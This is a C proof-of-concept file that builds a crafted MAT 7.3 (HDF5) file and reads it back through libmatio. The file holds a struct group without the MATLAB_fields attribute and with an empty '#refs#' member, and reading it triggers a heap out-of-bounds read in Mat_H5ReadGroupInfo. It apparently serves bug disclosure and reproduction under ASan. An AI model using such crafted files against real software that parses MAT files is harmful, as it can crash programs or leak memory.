/*
 * PoC: heap out-of-bounds read in Mat_H5ReadGroupInfo (src/mat73.c) when a
 * v7.3 structure group without the MATLAB_fields attribute contains a member
 * link that is not a field dataset (here an empty "#refs#" group).
 *
 * The file written below is an ordinary HDF5-based MAT 7.3 file: a 1x1 struct
 * "s" with two 1x4 double fields "a" and "b", stored the way non-MATLAB
 * writers (e.g. h5py) store structures, plus an empty "#refs#" member group.
 * It is created with the public HDF5 C API and read back through the public
 * matio API (Mat_Open/Mat_VarRead).
 *
 * Build (against an ASan-instrumented libmatio):
 *   cc -g -fsanitize=address -o poc_residual pocs/residual.c \
 *      -I<srcdir> -I<builddir> <libmatio> -lhdf5 -lz -lm
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <hdf5.h>

#include "matio.h"

static void
write_class_attribute(hid_t obj_id, const char *class_name)
{
    hid_t type_id, space_id, attr_id;

    type_id = H5Tcopy(H5T_C_S1);
    H5Tset_size(type_id, strlen(class_name));
    H5Tset_strpad(type_id, H5T_STR_NULLTERM);
    space_id = H5Screate(H5S_SCALAR);
    attr_id = H5Acreate(obj_id, "MATLAB_class", type_id, space_id, H5P_DEFAULT, H5P_DEFAULT);
    H5Awrite(attr_id, type_id, class_name);
    H5Aclose(attr_id);
    H5Sclose(space_id);
    H5Tclose(type_id);
}

static void
write_double_field(hid_t struct_id, const char *name, const double *values)
{
    hid_t space_id, dset_id;
    hsize_t dims[2] = {4, 1}; /* MATLAB 1x4 */

    space_id = H5Screate_simple(2, dims, NULL);
    dset_id = H5Dcreate(struct_id, name, H5T_NATIVE_DOUBLE, space_id, H5P_DEFAULT, H5P_DEFAULT,
                        H5P_DEFAULT);
    write_class_attribute(dset_id, "double");
    H5Dwrite(dset_id, H5T_NATIVE_DOUBLE, H5S_ALL, H5S_ALL, H5P_DEFAULT, values);
    H5Dclose(dset_id);
    H5Sclose(space_id);
}

static int
create_mat_file(const char *path)
{
    hid_t fcpl_id, file_id, struct_id;
    FILE *fp;
    unsigned short version = 0x0200, endian = 0x4d49; /* "IM" */
    char header[128];
    static const double a[4] = {1, 2, 3, 4};
    static const double b[4] = {2, 3, 4, 5};

    fcpl_id = H5Pcreate(H5P_FILE_CREATE);
    H5Pset_userblock(fcpl_id, 512);
    file_id = H5Fcreate(path, H5F_ACC_TRUNC, fcpl_id, H5P_DEFAULT);
    H5Fclose(file_id);
    H5Pclose(fcpl_id);

    /* MAT 7.3 file header inside the HDF5 userblock */
    fp = fopen(path, "r+b");
    if ( NULL == fp )
        return -1;
    memset(header, ' ', sizeof(header));
    memcpy(header, "MATLAB 7.3 MAT-file, Created by: poc HDF5 schema 0.5", 52);
    memcpy(header + 124, &version, 2);
    memcpy(header + 126, &endian, 2);
    fseek(fp, 0, SEEK_SET);
    fwrite(header, 1, sizeof(header), fp);
    fclose(fp);

    file_id = H5Fopen(path, H5F_ACC_RDWR, H5P_DEFAULT);
    if ( file_id < 0 )
        return -1;

    struct_id = H5Gcreate(file_id, "/s", H5P_DEFAULT, H5P_DEFAULT, H5P_DEFAULT);
    write_class_attribute(struct_id, "struct");
    write_double_field(struct_id, "a", a);
    write_double_field(struct_id, "b", b);
    /* A member of the structure group that is not a field dataset. The reader
     * explicitly skips links with this name when enumerating fields. */
    H5Gclose(H5Gcreate(struct_id, "#refs#", H5P_DEFAULT, H5P_DEFAULT, H5P_DEFAULT));
    H5Gclose(struct_id);
    H5Fclose(file_id);

    return 0;
}

int
main(int argc, char **argv)
{
    const char *path = argc > 1 ? argv[1] : "/tmp/matio_poc_nofields_refs.mat";
    mat_t *mat;
    matvar_t *matvar;

    if ( create_mat_file(path) )
        return 2;

    mat = Mat_Open(path, MAT_ACC_RDONLY);
    if ( NULL == mat ) {
        fprintf(stderr, "Mat_Open failed\n");
        return 2;
    }

    matvar = Mat_VarRead(mat, "s");
    if ( NULL == matvar ) {
        fprintf(stderr, "Mat_VarRead failed\n");
        Mat_Close(mat);
        return 2;
    }

    printf("read %s: class=%d fields=%u\n", matvar->name, matvar->class_type,
           Mat_VarGetNumberOfFields(matvar));
    {
        char *const *fieldnames = Mat_VarGetStructFieldnames(matvar);
        unsigned i, n = Mat_VarGetNumberOfFields(matvar);
        for ( i = 0; i < n && NULL != fieldnames; i++ ) {
            matvar_t *field;
            printf("  field %u: %s\n", i, fieldnames[i] ? fieldnames[i] : "(null)");
            field = Mat_VarGetStructField(matvar, fieldnames[i], MAT_BY_NAME, 0);
            if ( NULL != field && field->data_type == MAT_T_DOUBLE && NULL != field->data ) {
                double *d = (double *)field->data;
                printf("  %s = %g %g %g %g\n", field->name, d[0], d[1], d[2], d[3]);
            }
        }
    }

    Mat_VarFree(matvar);
    Mat_Close(mat);
    return 0;
}
